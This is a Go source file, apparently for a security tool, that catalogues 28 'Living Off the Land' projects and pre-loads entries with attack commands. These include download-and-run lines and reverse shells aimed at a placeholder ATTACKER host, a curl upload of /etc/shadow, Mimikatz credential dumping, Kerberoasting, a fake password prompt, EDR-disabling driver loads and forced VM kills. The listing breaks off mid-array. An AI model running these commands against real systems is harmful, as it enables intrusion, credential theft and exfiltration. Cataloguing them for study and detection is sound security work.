package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ---- LOL (Living Off the Land) Integration Types ----

// LOLProject represents one of the 28 LOL ecosystem projects
type LOLProject struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	ShortName   string `json:"shortName"`
	Description string `json:"description"`
	URL         string `json:"url"`
	GitHubURL   string `json:"githubUrl,omitempty"`
	Platform    string `json:"platform"` // windows, linux, macos, esxi, cross, ad, cloud
	Category    string `json:"category"` // binaries, drivers, scripts, c2, persistence, evasion, tools, apis, hardware
	DataFormat  string `json:"dataFormat,omitempty"`
	EntryCount  int    `json:"entryCount"`
	Icon        string `json:"icon,omitempty"`
}

// LOLEntry is the unified schema for entries across all LOL projects
type LOLEntry struct {
	ID          string            `json:"id"`
	ProjectID   string            `json:"projectId"`
	Name        string            `json:"name"`
	Description string            `json:"description"`
	Platform    string            `json:"platform"`
	Category    string            `json:"category"`
	MitreIDs    []string          `json:"mitreIds,omitempty"`
	Commands    []LOLCommand      `json:"commands,omitempty"`
	Functions   []string          `json:"functions,omitempty"`
	Paths       []string          `json:"paths,omitempty"`
	Detection   []LOLDetection    `json:"detection,omitempty"`
	Resources   []string          `json:"resources,omitempty"`
	Tags        []string          `json:"tags,omitempty"`
	Hashes      map[string]string `json:"hashes,omitempty"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

type LOLCommand struct {
	Command     string `json:"command"`
	Description string `json:"description"`
	Usecase     string `json:"usecase,omitempty"`
	Category    string `json:"category,omitempty"`
	Privileges  string `json:"privileges,omitempty"`
	MitreID     string `json:"mitreId,omitempty"`
	OS          string `json:"os,omitempty"`
}

type LOLDetection struct {
	Type  string `json:"type"` // sigma, elastic, splunk, ioc, yara
	Name  string `json:"name,omitempty"`
	Value string `json:"value"`
	URL   string `json:"url,omitempty"`
}

// LOLChain is a sequence of LOL entries forming an attack chain
type LOLChain struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description,omitempty"`
	Platform    string         `json:"platform"`
	Steps       []LOLChainStep `json:"steps"`
	MitreTactics []string      `json:"mitreTactics,omitempty"`
	CreatedAt   string         `json:"createdAt"`
}

type LOLChainStep struct {
	Order       int    `json:"order"`
	EntryID     string `json:"entryId"`
	EntryName   string `json:"entryName"`
	ProjectID   string `json:"projectId"`
	CommandIdx  int    `json:"commandIdx"` // which command from the entry to use
	Description string `json:"description,omitempty"`
	MitreID     string `json:"mitreId,omitempty"`
	Tactic      string `json:"tactic,omitempty"`
}

type LOLStats struct {
	TotalProjects  int            `json:"totalProjects"`
	TotalEntries   int            `json:"totalEntries"`
	ByProject      map[string]int `json:"byProject"`
	ByPlatform     map[string]int `json:"byPlatform"`
	ByCategory     map[string]int `json:"byCategory"`
	MitreHeatmap   map[string]int `json:"mitreHeatmap"`
	TopBinaries    []string       `json:"topBinaries"`
}

// ---- In-Memory Catalog ----

var lolCatalog = struct {
	sync.RWMutex
	projects map[string]LOLProject
	entries  map[string]LOLEntry
	chains   map[string]LOLChain
}{
	projects: make(map[string]LOLProject),
	entries:  make(map[string]LOLEntry),
	chains:   make(map[string]LOLChain),
}

// initLOLCatalog pre-populates all 28 LOL projects and their key entries
func initLOLCatalog() {
	projects := []LOLProject{
		{ID: "lolbas", Name: "LOLBAS", ShortName: "LOLBAS", Description: "Living Off the Land Binaries, Scripts, and Libraries — Windows binaries that can bypass security controls", URL: "https://lolbas-project.github.io", GitHubURL: "https://github.com/LOLBAS-Project/LOLBAS", Platform: "windows", Category: "binaries", DataFormat: "yaml", EntryCount: 230, Icon: "LOLBAS"},
		{ID: "gtfobins", Name: "GTFOBins", ShortName: "GTFOBins", Description: "Unix binaries that bypass local security restrictions in misconfigured systems", URL: "https://gtfobins.github.io", GitHubURL: "https://github.com/GTFOBins/GTFOBins.github.io", Platform: "linux", Category: "binaries", DataFormat: "json", EntryCount: 350, Icon: "GTFOBins"},
		{ID: "loldrivers", Name: "LOLDrivers", ShortName: "LOLDrivers", Description: "Windows drivers used by adversaries to bypass security controls", URL: "https://loldrivers.io", GitHubURL: "https://github.com/magicsword-io/LOLDrivers", Platform: "windows", Category: "drivers", DataFormat: "json", EntryCount: 510, Icon: "LOLDrivers"},
		{ID: "lolc2", Name: "LOLC2", ShortName: "LOLC2", Description: "C2 frameworks leveraging legitimate services to evade detection", URL: "https://lolc2.github.io", GitHubURL: "https://github.com/lolc2/lolc2.github.io", Platform: "cross", Category: "c2", DataFormat: "json", EntryCount: 125, Icon: "LOLC2"},
		{ID: "lots", Name: "LOTS Project", ShortName: "LOTS", Description: "Legitimate domains used by attackers for phishing, C2, exfiltration", URL: "https://lots-project.com", Platform: "cross", Category: "evasion", EntryCount: 200, Icon: "LOTS"},
		{ID: "malapi", Name: "MalAPI.io", ShortName: "MalAPI", Description: "Windows APIs mapped to common malware techniques", URL: "https://malapi.io", Platform: "windows", Category: "apis", EntryCount: 150, Icon: "MalAPI"},
		{ID: "hijacklibs", Name: "HijackLibs", ShortName: "HijackLibs", Description: "Curated list of DLL Hijacking candidates", URL: "https://hijacklibs.net", GitHubURL: "https://github.com/wietze/HijackLibs", Platform: "windows", Category: "evasion", DataFormat: "yaml", EntryCount: 576, Icon: "HijackLibs"},
		{ID: "wadcoms", Name: "WADComs", ShortName: "WADComs", Description: "Offensive security tool commands for Windows/AD environments", URL: "https://wadcoms.github.io", GitHubURL: "https://github.com/WADComs/wadcoms.github.io", Platform: "ad", Category: "tools", DataFormat: "markdown", EntryCount: 100, Icon: "WADComs"},
		{ID: "loobins", Name: "LOOBins", ShortName: "LOOBins", Description: "macOS binaries used by threat actors for malicious purposes", URL: "https://www.loobins.io", GitHubURL: "https://github.com/infosecB/LOOBins", Platform: "macos", Category: "binaries", DataFormat: "yaml", EntryCount: 59, Icon: "LOOBins"},
		{ID: "lolapps", Name: "LOLApps", ShortName: "LOLApps", Description: "Built-in and third-party applications abused for adversarial gain", URL: "https://lolapps-project.github.io", Platform: "cross", Category: "tools", EntryCount: 50, Icon: "LOLApps"},
		{ID: "bootloaders", Name: "Bootloaders", ShortName: "Bootloaders", Description: "Known malicious bootloaders for various operating systems", URL: "https://www.bootloaders.io", GitHubURL: "https://github.com/magicsword-io/bootloaders", Platform: "cross", Category: "persistence", DataFormat: "json", EntryCount: 520, Icon: "Bootloaders"},
		{ID: "lolrmm", Name: "LOLRMM", ShortName: "LOLRMM", Description: "Remote Monitoring and Management tools potentially abused by threat actors", URL: "https://lolrmm.io", GitHubURL: "https://github.com/magicsword-io/LOLRMM", Platform: "cross", Category: "tools", DataFormat: "json", EntryCount: 293, Icon: "LOLRMM"},
		{ID: "lolesxi", Name: "LOLESXi", ShortName: "LOLESXi", Description: "ESXi binaries/scripts used by adversaries in their operations", URL: "https://lolesxi-project.github.io/LOLESXi/", GitHubURL: "https://github.com/lolesxi-project/LOLESXi", Platform: "esxi", Category: "binaries", DataFormat: "json", EntryCount: 24, Icon: "LOLESXi"},
		{ID: "lofp", Name: "LoFP", ShortName: "LoFP", Description: "Autogenerated collection of false positives from popular detection rule sets", URL: "https://br0k3nlab.com/LoFP/", Platform: "cross", Category: "detection", EntryCount: 500, Icon: "LoFP"},
		{ID: "filesec", Name: "FileSec", ShortName: "FileSec", Description: "File extensions used by attackers for payload delivery", URL: "https://filesec.io", Platform: "cross", Category: "evasion", EntryCount: 100, Icon: "FileSec"},
		{ID: "wtfbins", Name: "WTFBins", ShortName: "WTFBins", Description: "Binaries that behave exactly like malware but somehow are not", URL: "https://wtfbins.wtf", Platform: "cross", Category: "evasion", EntryCount: 30, Icon: "WTFBins"},
		{ID: "lofl", Name: "LOFL Project", ShortName: "LOFL", Description: "Living Off the Foreign Land — remote system cmdlets and binaries", URL: "https://lofl-project.github.io", Platform: "windows", Category: "tools", EntryCount: 80, Icon: "LOFL"},
		{ID: "persistence", Name: "Persistence Info", ShortName: "Persistence", Description: "Windows persistence mechanisms for protection/detection", URL: "https://persistence-info.github.io", Platform: "windows", Category: "persistence", EntryCount: 60, Icon: "Persistence"},
		{ID: "lolcerts", Name: "lolcerts", ShortName: "lolcerts", Description: "Code signing certificates known to be abused in the wild", URL: "https://github.com/WithSecureLabs/lolcerts", GitHubURL: "https://github.com/WithSecureLabs/lolcerts", Platform: "cross", Category: "evasion", EntryCount: 40, Icon: "lolcerts"},
		{ID: "lotp", Name: "LOTP", ShortName: "LOTP", Description: "Development tools with RCE-By-Design features in CI/CD pipelines", URL: "https://boostsecurityio.github.io/lotp/", Platform: "cross", Category: "tools", EntryCount: 50, Icon: "LOTP"},
		{ID: "lolbins-cti", Name: "lolbins-cti", ShortName: "CTI LOLBins", Description: "How LOLBin binaries are used by threat actors during intrusions", URL: "https://lolbins-ctidriven.vercel.app/", Platform: "cross", Category: "binaries", EntryCount: 100, Icon: "CTI"},
		{ID: "lot-webhooks", Name: "LOT Webhooks", ShortName: "LOT Webhooks", Description: "Webhooks exploited for data exfiltration and C2 communications", URL: "https://lotwebhooks.github.io", Platform: "cross", Category: "c2", EntryCount: 30, Icon: "Webhooks"},
		{ID: "project-lost", Name: "Project-Lost", ShortName: "Project-Lost", Description: "Security tools used by adversaries to bypass controls and carry out attacks", URL: "https://0xanalyst.github.io/Project-Lost/", Platform: "cross", Category: "tools", EntryCount: 50, Icon: "Lost"},
		{ID: "lot-tunnels", Name: "LOT Tunnels", ShortName: "LOT Tunnels", Description: "Digital tunnels abused for data exfiltration, persistence, shell access", URL: "https://lottunnels.github.io", Platform: "cross", Category: "evasion", EntryCount: 40, Icon: "Tunnels"},
		{ID: "lolad", Name: "LOLAD", ShortName: "LOLAD", Description: "Active Directory techniques and commands for offensive security operations", URL: "https://lolad-project.github.io", Platform: "ad", Category: "tools", EntryCount: 80, Icon: "LOLAD"},
		{ID: "lolapi", Name: "LOLAPI", ShortName: "LOLAPI", Description: "Real-world abused APIs across Windows, Cloud, and Browser platforms", URL: "https://themagicclaw.github.io/LOLAPI/", Platform: "cross", Category: "apis", EntryCount: 100, Icon: "LOLAPI"},
		{ID: "byol", Name: "BYOL", ShortName: "BYOL", Description: "Bring Your Own Land — red teaming with operator-deployed binaries", URL: "https://www.mandiant.com", Platform: "cross", Category: "tools", EntryCount: 20, Icon: "BYOL"},
		{ID: "lothardware", Name: "Living Off The Hardware", ShortName: "LOTHardware", Description: "Identifying and utilizing malicious hardware and devices", URL: "https://lothardware.com.tr", Platform: "hardware", Category: "hardware", EntryCount: 25, Icon: "Hardware"},
	}

	// Pre-populate key LOLBAS entries (most commonly used in red team ops)
	lolbasEntries := []LOLEntry{
		{ID: "lolbas-certutil", ProjectID: "lolbas", Name: "Certutil.exe", Description: "Certificate utility that can download files, encode/decode, and calculate hashes", Platform: "windows", Category: "download", MitreIDs: []string{"T1105", "T1140", "T1036"}, Commands: []LOLCommand{{Command: "certutil.exe -urlcache -split -f http://ATTACKER/payload.exe C:\\temp\\payload.exe", Description: "Download file from remote server", Usecase: "Download payload", Category: "Download", Privileges: "User", MitreID: "T1105"}, {Command: "certutil.exe -encode inputfile.exe encoded.txt", Description: "Base64 encode a file", Usecase: "Encode payload for transfer", Category: "Encode", Privileges: "User", MitreID: "T1140"}, {Command: "certutil.exe -decode encoded.txt decoded.exe", Description: "Base64 decode a file", Usecase: "Decode encoded payload", Category: "Decode", Privileges: "User", MitreID: "T1140"}}, Paths: []string{"C:\\Windows\\System32\\certutil.exe"}, Detection: []LOLDetection{{Type: "sigma", Name: "Certutil download", Value: "Suspicious certutil command line"}}, Tags: []string{"download", "encode", "decode", "LOLBin"}},
		{ID: "lolbas-mshta", ProjectID: "lolbas", Name: "Mshta.exe", Description: "Execute Microsoft HTML Applications", Platform: "windows", Category: "execution", MitreIDs: []string{"T1218.005"}, Commands: []LOLCommand{{Command: "mshta.exe http://ATTACKER/payload.hta", Description: "Execute remote HTA payload", Usecase: "Execute arbitrary code via HTA", Category: "Execute", Privileges: "User", MitreID: "T1218.005"}}, Paths: []string{"C:\\Windows\\System32\\mshta.exe"}, Tags: []string{"execution", "hta", "LOLBin"}},
		{ID: "lolbas-regsvr32", ProjectID: "lolbas", Name: "Regsvr32.exe", Description: "Register and unregister OLE controls including DLLs", Platform: "windows", Category: "execution", MitreIDs: []string{"T1218.010"}, Commands: []LOLCommand{{Command: "regsvr32 /s /n /u /i:http://ATTACKER/file.sct scrobj.dll", Description: "Execute remote SCT file via Squiblydoo", Usecase: "AppLocker bypass", Category: "AWL Bypass", Privileges: "User", MitreID: "T1218.010"}}, Paths: []string{"C:\\Windows\\System32\\regsvr32.exe"}, Tags: []string{"execution", "awl-bypass", "LOLBin"}},
		{ID: "lolbas-rundll32", ProjectID: "lolbas", Name: "Rundll32.exe", Description: "Execute DLL files and call specific exports", Platform: "windows", Category: "execution", MitreIDs: []string{"T1218.011"}, Commands: []LOLCommand{{Command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")", Description: "Execute JavaScript via rundll32", Usecase: "Execute arbitrary commands", Category: "Execute", Privileges: "User", MitreID: "T1218.011"}}, Paths: []string{"C:\\Windows\\System32\\rundll32.exe"}, Tags: []string{"execution", "LOLBin"}},
		{ID: "lolbas-msbuild", ProjectID: "lolbas", Name: "MSBuild.exe", Description: "Microsoft Build Engine — compiles and executes code", Platform: "windows", Category: "execution", MitreIDs: []string{"T1127.001"}, Commands: []LOLCommand{{Command: "MSBuild.exe payload.csproj", Description: "Build and execute inline C# task", Usecase: "Execute arbitrary code via build files", Category: "Execute", Privileges: "User", MitreID: "T1127.001"}}, Paths: []string{"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}, Tags: []string{"execution", "compile", "LOLBin"}},
		{ID: "lolbas-bitsadmin", ProjectID: "lolbas", Name: "Bitsadmin.exe", Description: "Windows Background Intelligent Transfer Service admin tool", Platform: "windows", Category: "download", MitreIDs: []string{"T1197", "T1105"}, Commands: []LOLCommand{{Command: "bitsadmin /transfer job /download /priority high http://ATTACKER/payload.exe C:\\temp\\payload.exe", Description: "Download file using BITS", Usecase: "Stealthy file download", Category: "Download", Privileges: "User", MitreID: "T1105"}}, Paths: []string{"C:\\Windows\\System32\\bitsadmin.exe"}, Tags: []string{"download", "persistence", "LOLBin"}},
		{ID: "lolbas-wmic", ProjectID: "lolbas", Name: "Wmic.exe", Description: "Windows Management Instrumentation Command-line", Platform: "windows", Category: "execution", MitreIDs: []string{"T1047", "T1218"}, Commands: []LOLCommand{{Command: "wmic process call create \"cmd /c payload.exe\"", Description: "Execute process via WMI", Usecase: "Remote and local execution", Category: "Execute", Privileges: "User", MitreID: "T1047"}, {Command: "wmic /node:TARGET process call create \"cmd /c net user\"", Description: "Remote command execution via WMI", Usecase: "Lateral movement", Category: "Execute", Privileges: "Admin", MitreID: "T1047"}}, Paths: []string{"C:\\Windows\\System32\\wbem\\wmic.exe"}, Tags: []string{"execution", "lateral-movement", "LOLBin"}},
		{ID: "lolbas-powershell", ProjectID: "lolbas", Name: "PowerShell.exe", Description: "Windows scripting engine and shell", Platform: "windows", Category: "execution", MitreIDs: []string{"T1059.001"}, Commands: []LOLCommand{{Command: "powershell.exe -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')\"", Description: "Download and execute PowerShell script", Usecase: "Fileless execution", Category: "Execute", Privileges: "User", MitreID: "T1059.001"}, {Command: "powershell.exe -ep bypass -enc BASE64PAYLOAD", Description: "Execute base64-encoded command", Usecase: "Obfuscated execution", Category: "Execute", Privileges: "User", MitreID: "T1059.001"}}, Paths: []string{"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, Tags: []string{"execution", "scripting", "LOLBin"}},
		{ID: "lolbas-cscript", ProjectID: "lolbas", Name: "Cscript.exe", Description: "Windows Script Host command-line version", Platform: "windows", Category: "execution", MitreIDs: []string{"T1059.005"}, Commands: []LOLCommand{{Command: "cscript.exe //E:jscript payload.txt", Description: "Execute JScript file with arbitrary extension", Usecase: "Script execution bypass", Category: "Execute", Privileges: "User", MitreID: "T1059.005"}}, Paths: []string{"C:\\Windows\\System32\\cscript.exe"}, Tags: []string{"execution", "scripting", "LOLBin"}},
		{ID: "lolbas-installutil", ProjectID: "lolbas", Name: "InstallUtil.exe", Description: ".NET installation utility", Platform: "windows", Category: "execution", MitreIDs: []string{"T1218.004"}, Commands: []LOLCommand{{Command: "InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll", Description: "Execute code via InstallUtil uninstall method", Usecase: "AWL bypass, code execution", Category: "AWL Bypass", Privileges: "User", MitreID: "T1218.004"}}, Paths: []string{"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"}, Tags: []string{"execution", "awl-bypass", "LOLBin"}},
	}

	// GTFOBins entries
	gtfoEntries := []LOLEntry{
		{ID: "gtfo-bash", ProjectID: "gtfobins", Name: "bash", Description: "Bourne-Again SHell", Platform: "linux", Category: "shell", MitreIDs: []string{"T1059.004"}, Commands: []LOLCommand{{Command: "bash -p", Description: "Spawn shell preserving SUID privileges", Usecase: "SUID privilege escalation", Category: "shell", Privileges: "suid"}, {Command: "bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'", Description: "Reverse shell", Usecase: "Reverse shell", Category: "reverse-shell"}}, Functions: []string{"shell", "reverse-shell", "file-read", "file-write", "suid"}, Tags: []string{"shell", "suid", "reverse-shell", "GTFOBin"}},
		{ID: "gtfo-python", ProjectID: "gtfobins", Name: "python", Description: "Python interpreter", Platform: "linux", Category: "shell", MitreIDs: []string{"T1059.006"}, Commands: []LOLCommand{{Command: "python -c 'import os; os.system(\"/bin/sh\")'", Description: "Spawn shell via Python", Usecase: "Shell escape", Category: "shell"}, {Command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'", Description: "Spawn interactive TTY", Usecase: "Shell upgrade", Category: "shell"}, {Command: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", Description: "Reverse shell", Usecase: "Reverse shell", Category: "reverse-shell"}}, Functions: []string{"shell", "reverse-shell", "file-read", "file-write", "suid", "sudo"}, Tags: []string{"shell", "reverse-shell", "privesc", "GTFOBin"}},
		{ID: "gtfo-find", ProjectID: "gtfobins", Name: "find", Description: "Search for files in directory hierarchy", Platform: "linux", Category: "shell", MitreIDs: []string{"T1059.004"}, Commands: []LOLCommand{{Command: "find . -exec /bin/sh \\; -quit", Description: "Spawn shell via find exec", Usecase: "SUID privilege escalation", Category: "shell", Privileges: "suid"}}, Functions: []string{"shell", "suid", "sudo", "command"}, Tags: []string{"shell", "suid", "GTFOBin"}},
		{ID: "gtfo-vim", ProjectID: "gtfobins", Name: "vim", Description: "Vi IMproved text editor", Platform: "linux", Category: "shell", MitreIDs: []string{"T1059.004"}, Commands: []LOLCommand{{Command: "vim -c ':!/bin/sh'", Description: "Shell escape from vim", Usecase: "Shell escape", Category: "shell"}}, Functions: []string{"shell", "file-read", "file-write", "suid", "sudo"}, Tags: []string{"shell", "file-ops", "GTFOBin"}},
		{ID: "gtfo-nmap", ProjectID: "gtfobins", Name: "nmap", Description: "Network exploration and security scanner", Platform: "linux", Category: "shell", MitreIDs: []string{"T1059.004"}, Commands: []LOLCommand{{Command: "nmap --interactive\\n!sh", Description: "Shell via nmap interactive mode (old versions)", Usecase: "Shell escape", Category: "shell"}, {Command: "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; nmap --script=$TF", Description: "Shell via nmap NSE script", Usecase: "Shell escape", Category: "shell"}}, Functions: []string{"shell", "sudo"}, Tags: []string{"shell", "GTFOBin"}},
		{ID: "gtfo-curl", ProjectID: "gtfobins", Name: "curl", Description: "Transfer data from or to a server", Platform: "linux", Category: "download", MitreIDs: []string{"T1105"}, Commands: []LOLCommand{{Command: "curl http://ATTACKER/payload -o /tmp/payload", Description: "Download file", Usecase: "Download payload", Category: "download"}, {Command: "curl -X POST -d @/etc/shadow http://ATTACKER/exfil", Description: "Exfiltrate file contents", Usecase: "Data exfiltration", Category: "upload"}}, Functions: []string{"download", "upload", "file-read"}, Tags: []string{"download", "exfiltration", "GTFOBin"}},
		{ID: "gtfo-wget", ProjectID: "gtfobins", Name: "wget", Description: "Network downloader", Platform: "linux", Category: "download", MitreIDs: []string{"T1105"}, Commands: []LOLCommand{{Command: "wget http://ATTACKER/payload -O /tmp/payload", Description: "Download file", Usecase: "Download payload", Category: "download"}}, Functions: []string{"download", "file-read", "file-write"}, Tags: []string{"download", "GTFOBin"}},
	}

	// LOLDrivers entries
	driverEntries := []LOLEntry{
		{ID: "drv-procexp", ProjectID: "loldrivers", Name: "PROCEXP152.sys", Description: "Process Explorer driver — used for kernel-level process manipulation", Platform: "windows", Category: "driver", MitreIDs: []string{"T1068", "T1562.001"}, Commands: []LOLCommand{{Command: "sc.exe create ProcExp binPath= C:\\path\\PROCEXP152.sys type= kernel", Description: "Load Process Explorer driver", Usecase: "Disable security products at kernel level", Category: "Load", Privileges: "kernel", MitreID: "T1068"}}, Hashes: map[string]string{"sha256": "known"}, Tags: []string{"kernel", "edr-bypass", "LOLDriver"}},
		{ID: "drv-dbutil", ProjectID: "loldrivers", Name: "dbutil_2_3.sys", Description: "Dell BIOS utility driver — vulnerable to arbitrary memory read/write", Platform: "windows", Category: "driver", MitreIDs: []string{"T1068"}, Commands: []LOLCommand{{Command: "sc.exe create DBUtil binPath= C:\\path\\dbutil_2_3.sys type= kernel", Description: "Load vulnerable Dell driver for kernel exploitation", Usecase: "Elevate to SYSTEM via kernel exploit", Category: "Load", Privileges: "kernel"}}, Tags: []string{"kernel", "privesc", "vulnerable", "LOLDriver"}},
	}

	// LOLC2 entries
	c2Entries := []LOLEntry{
		{ID: "lolc2-discord", ProjectID: "lolc2", Name: "Discord", Description: "Discord platform used for C2 communications via bots and webhooks", Platform: "cross", Category: "c2-service", MitreIDs: []string{"T1102", "T1071.001"}, Commands: []LOLCommand{{Command: "Discord Bot API / Webhooks", Description: "Use Discord channels for command relay", Usecase: "C2 over legitimate platform", Category: "C2"}}, Metadata: map[string]string{"projects": "12", "services": "bot,webhook"}, Tags: []string{"c2", "evasion", "LOLC2"}},
		{ID: "lolc2-slack", ProjectID: "lolc2", Name: "Slack", Description: "Slack workspace used for C2 communications", Platform: "cross", Category: "c2-service", MitreIDs: []string{"T1102", "T1071.001"}, Commands: []LOLCommand{{Command: "Slack API / Webhooks", Description: "Use Slack channels for command relay", Usecase: "C2 over legitimate platform", Category: "C2"}}, Metadata: map[string]string{"projects": "10"}, Tags: []string{"c2", "evasion", "LOLC2"}},
		{ID: "lolc2-telegram", ProjectID: "lolc2", Name: "Telegram", Description: "Telegram Bot API used for C2 communications", Platform: "cross", Category: "c2-service", MitreIDs: []string{"T1102", "T1071.001"}, Commands: []LOLCommand{{Command: "Telegram Bot API", Description: "Use Telegram bots for C2", Usecase: "C2 over legitimate platform", Category: "C2"}}, Metadata: map[string]string{"projects": "10"}, Tags: []string{"c2", "evasion", "LOLC2"}},
		{ID: "lolc2-github", ProjectID: "lolc2", Name: "GitHub", Description: "GitHub repos/gists/issues used for C2 communications", Platform: "cross", Category: "c2-service", MitreIDs: []string{"T1102", "T1071.001"}, Commands: []LOLCommand{{Command: "GitHub API / Gists / Issues", Description: "Use GitHub for dead drop C2", Usecase: "C2 over legitimate developer platform", Category: "C2"}}, Metadata: map[string]string{"projects": "5"}, Tags: []string{"c2", "evasion", "LOLC2"}},
		{ID: "lolc2-azure", ProjectID: "lolc2", Name: "Microsoft Azure", Description: "Azure Functions and services used for C2 infrastructure", Platform: "cross", Category: "c2-service", MitreIDs: []string{"T1102", "T1583.006"}, Commands: []LOLCommand{{Command: "Azure Functions / Graph API / Blob Storage", Description: "Use Azure services for C2 infrastructure", Usecase: "Cloud-hosted C2", Category: "C2"}}, Metadata: map[string]string{"projects": "7"}, Tags: []string{"c2", "cloud", "LOLC2"}},
	}

	// HijackLibs entries
	hijackEntries := []LOLEntry{
		{ID: "hijack-version", ProjectID: "hijacklibs", Name: "version.dll", Description: "Version information DLL — common sideloading target", Platform: "windows", Category: "dll-hijack", MitreIDs: []string{"T1574.001", "T1574.002"}, Commands: []LOLCommand{{Command: "Place malicious version.dll in application directory", Description: "DLL sideloading via version.dll", Usecase: "Code execution via DLL sideload", Category: "Sideloading", Privileges: "User"}}, Tags: []string{"dll-hijack", "sideloading", "evasion", "HijackLib"}},
		{ID: "hijack-dbghelp", ProjectID: "hijacklibs", Name: "dbghelp.dll", Description: "Debug helper library — widely sideloaded", Platform: "windows", Category: "dll-hijack", MitreIDs: []string{"T1574.001"}, Commands: []LOLCommand{{Command: "Place malicious dbghelp.dll in application directory", Description: "DLL sideloading via dbghelp.dll", Usecase: "Persistence and evasion", Category: "Sideloading"}}, Tags: []string{"dll-hijack", "sideloading", "HijackLib"}},
	}

	// LOOBins entries
	loobinEntries := []LOLEntry{
		{ID: "loobin-osascript", ProjectID: "loobins", Name: "osascript", Description: "Execute AppleScript and JavaScript for Automation", Platform: "macos", Category: "execution", MitreIDs: []string{"T1059.002"}, Commands: []LOLCommand{{Command: "osascript -e 'do shell script \"whoami\"'", Description: "Execute shell command via AppleScript", Usecase: "Command execution", Category: "Execution"}, {Command: "osascript -e 'tell app \"Finder\" to display dialog \"Enter password:\" default answer \"\" with hidden answer'", Description: "Credential harvesting dialog", Usecase: "Credential phishing", Category: "Credential Access"}}, Paths: []string{"/usr/bin/osascript"}, Tags: []string{"execution", "LOOBin", "macos"}},
		{ID: "loobin-caffeinate", ProjectID: "loobins", Name: "caffeinate", Description: "Prevent system from sleeping — fork processes", Platform: "macos", Category: "execution", MitreIDs: []string{"T1059"}, Commands: []LOLCommand{{Command: "caffeinate -i /tmp/payload", Description: "Fork and execute a process", Usecase: "Process execution and anti-sleep", Category: "Execution"}}, Paths: []string{"/usr/bin/caffeinate"}, Tags: []string{"execution", "LOOBin", "macos"}},
	}

	// WADComs entries
	wadcomEntries := []LOLEntry{
		{ID: "wad-bloodhound", ProjectID: "wadcoms", Name: "BloodHound/SharpHound", Description: "Active Directory attack path mapping", Platform: "ad", Category: "recon", MitreIDs: []string{"T1087.002", "T1069.002"}, Commands: []LOLCommand{{Command: "SharpHound.exe -c All -d domain.local", Description: "Collect all AD objects", Usecase: "AD enumeration", Category: "Recon"}, {Command: "Invoke-BloodHound -CollectionMethod All", Description: "PowerShell-based collection", Usecase: "AD enumeration", Category: "Recon"}}, Tags: []string{"ad", "recon", "bloodhound", "WADCom"}},
		{ID: "wad-rubeus", ProjectID: "wadcoms", Name: "Rubeus", Description: "C# Kerberos abuse toolkit", Platform: "ad", Category: "credential-access", MitreIDs: []string{"T1558.003", "T1558.004"}, Commands: []LOLCommand{{Command: "Rubeus.exe kerberoast /outfile:hashes.txt", Description: "Kerberoasting attack", Usecase: "Extract service ticket hashes", Category: "Credential Access"}, {Command: "Rubeus.exe asreproast /outfile:asrep.txt", Description: "AS-REP Roasting attack", Usecase: "Extract AS-REP hashes for offline cracking", Category: "Credential Access"}}, Tags: []string{"ad", "kerberos", "credential-access", "WADCom"}},
		{ID: "wad-mimikatz", ProjectID: "wadcoms", Name: "Mimikatz", Description: "Credential extraction and Kerberos manipulation", Platform: "ad", Category: "credential-access", MitreIDs: []string{"T1003.001", "T1558.001"}, Commands: []LOLCommand{{Command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"", Description: "Dump credentials from LSASS", Usecase: "Credential extraction", Category: "Credential Access", Privileges: "SYSTEM"}, {Command: "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:Administrator\"", Description: "DCSync attack", Usecase: "Extract domain credentials", Category: "Credential Access", Privileges: "Domain Admin"}}, Tags: []string{"ad", "credentials", "WADCom"}},
	}

	// LOLAD entries
	loladEntries := []LOLEntry{
		{ID: "lolad-dsquery", ProjectID: "lolad", Name: "dsquery", Description: "Native AD query tool for domain enumeration", Platform: "ad", Category: "recon", MitreIDs: []string{"T1087.002"}, Commands: []LOLCommand{{Command: "dsquery user -inactive 4", Description: "Find inactive user accounts", Usecase: "AD enumeration", Category: "Recon"}, {Command: "dsquery computer -stalepwd 30", Description: "Find computers with stale passwords", Usecase: "AD enumeration", Category: "Recon"}}, Tags: []string{"ad", "native", "recon", "LOLAD"}},
		{ID: "lolad-nltest", ProjectID: "lolad", Name: "nltest", Description: "Network logon test utility for domain trust enumeration", Platform: "ad", Category: "recon", MitreIDs: []string{"T1482"}, Commands: []LOLCommand{{Command: "nltest /domain_trusts", Description: "Enumerate domain trusts", Usecase: "Trust discovery", Category: "Recon"}, {Command: "nltest /dclist:domain.local", Description: "List domain controllers", Usecase: "DC enumeration", Category: "Recon"}}, Tags: []string{"ad", "native", "trust-enum", "LOLAD"}},
	}

	// LOLESXi entries
	esxiEntries := []LOLEntry{
		{ID: "esxi-esxcli", ProjectID: "lolesxi", Name: "esxcli", Description: "ESXi command-line interface for managing hosts", Platform: "esxi", Category: "execution", MitreIDs: []string{"T1059"}, Commands: []LOLCommand{{Command: "esxcli vm process list", Description: "List running VMs", Usecase: "VM enumeration", Category: "Recon"}, {Command: "esxcli vm process kill --type=force --world-id=ID", Description: "Kill a running VM", Usecase: "VM destruction (ransomware)", Category: "Impact"}}, Tags: []string{"esxi", "vmware", "LOLESXi"}},
